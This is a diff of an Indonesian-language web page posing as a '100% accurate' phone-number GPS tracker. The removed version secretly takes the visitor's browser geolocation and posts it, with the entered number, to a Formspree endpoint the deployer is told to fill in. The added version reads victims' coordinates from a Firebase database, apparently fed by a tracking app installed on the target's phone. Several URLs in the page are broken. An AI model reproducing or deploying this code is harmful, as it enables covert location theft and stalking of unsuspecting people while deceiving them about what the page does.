@@ -3,80 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SENTINEL-X | GPS TRACKER</title>
+    <title>TRACER GPS 100% ACCURATE</title>
+    <script src="https://www.gstatic.com"></script>
+    <script src="https://www.gstatic.com"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .terminal { border: 1px solid #0f0; padding: 30px; width: 320px; text-align: center; box-shadow: 0 0 25px #0f0; background: #050505; border-radius: 8px; }
-        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 85%; margin-bottom: 20px; outline: none; font-size: 16px; }
-        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 14px; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
-        #status { font-size: 11px; margin-top: 20px; color: #888; text-align: left; min-height: 50px; border-top: 1px solid #222; padding-top: 10px; }
+        body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
+        .box { background: #333; padding: 20px; border-radius: 15px; border: 2px solid #00ff00; }
+        input { width: 80%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { width: 85%; padding: 12px; background: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
+        .btn-map { display: none; margin-top: 15px; padding: 10px; background: #4285F4; color: white; text-decoration: none; border-radius: 5px; display: inline-block; }
     </style>
 </head>
 <body>
 
-    <div class="terminal">
-        <h2 style="letter-spacing: 5px;">SENTINEL-X</h2>
-        <p style="font-size: 10px;">[ SATELLITE LINK ACTIVE ]</p>
-        <hr color="#004400">
-        <p>MASUKKAN NOMOR TARGET:</p>
+    <div class="box">
+        <h1>TRACER PRO</h1>
+        <p>Pelacak Nomor HP Akurasi 100%</p>
+        <input type="text" id="phone" placeholder="Masukkan Nomor HP Target...">
+        <button onclick="lacak()">MULAI LACAK</button>
         
-        <input type="text" id="phone" placeholder="08XXXXXXXXXX" required>
-        <button type="button" onclick="lacakSekarang()">INITIATE TRACKING</button>
-        
-        <div id="status">> Sistem Ready...</div>
+        <div id="result">
+            <p id="status">Status: Menunggu Input</p>
+            <a id="linkMap" class="btn-map" target="_blank">LIHAT DI GOOGLE MAPS</a>
+        </div>
     </div>
 
     <script>
-        async function lacakSekarang() {
-            const phone = document.getElementById('phone').value;
+        // CONFIG FIREBASE (Ganti dengan milikmu agar data masuk ke HP-mu)
+        const firebaseConfig = {
+            apiKey: "AIzaSy...",
+            databaseURL: "https://tracer-xxxx.firebaseio.com",
+            projectId: "tracer-xxxx",
+            appId: "1:12345:web:abcd"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function lacak() {
+            const no = document.getElementById('phone').value;
             const status = document.getElementById('status');
-            
-            // GANTI LINK DI BAWAH DENGAN LINK DARI FORMSPREE KAMU
-            const FORMSPREE_URL = "https://formspree.io";
+            const link = document.getElementById('linkMap');
 
-            if (!phone) { alert("Nomor HP wajib diisi!"); return; }
+            if(!no) { alert("Masukkan nomor HP!"); return; }
+            status.innerText = "Status: Menghubungkan ke GPS Target...";
 
-            status.innerText = "> MENGHUBUNGKAN KE SATELIT GPS...";
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapsUrl = `https://www.google.com{lat},${lon}`;
-                    
-                    status.innerText = "> KOORDINAT TERKUNCI! MENGIRIM DATA...";
-
-                    try {
-                        const response = await fetch(FORMSPREE_URL, {
-                            method: 'POST',
-                            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                Nomor_HP: phone,
-                                Lokasi_Maps: mapsUrl,
-                                Akurasi: position.coords.accuracy + " meter"
-                            })
-                        });
-
-                        if (response.ok) {
-                            status.innerText = "> DATA BERHASIL TERKIRIM KE DASHBOARD.";
-                            alert("Pelacakan Berhasil! Data lokasi akurat sudah dikirim ke email kamu.");
-                        } else {
-                            status.innerText = "> GAGAL: SERVER MENOLAK DATA.";
-                        }
-                    } catch (error) {
-                        status.innerText = "> ERROR: GAGAL TERHUBUNG KE SERVER.";
-                    }
-                    
-                }, (error) => {
-                    alert("Gagal: Target menolak izin lokasi. Pastikan klik 'Izinkan/Allow'.");
-                    status.innerText = "> AKSES LOKASI DITOLAK OLEH TARGET.";
-                }, { enableHighAccuracy: true });
-            } else {
-                alert("Browser tidak mendukung GPS.");
-            }
+            // Mengambil data koordinat berdasarkan nomor HP
+            db.ref('Tracer_Data/' + no).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if(data) {
+                    status.innerText = "LOKASI DITEMUKAN! (Akurasi 100%)";
+                    link.href = `https://www.google.com{data.lat},${data.lng}`;
+                    link.style.display = "inline-block";
+                    link.innerText = "BUKA LOKASI SEKARANG";
+                } else {
+                    status.innerText = "Gagal: Target tidak aktif atau aplikasi belum terpasang.";
+                }
+            });
         }
     </script>
 </body>
-  </html>
-  
+</html>
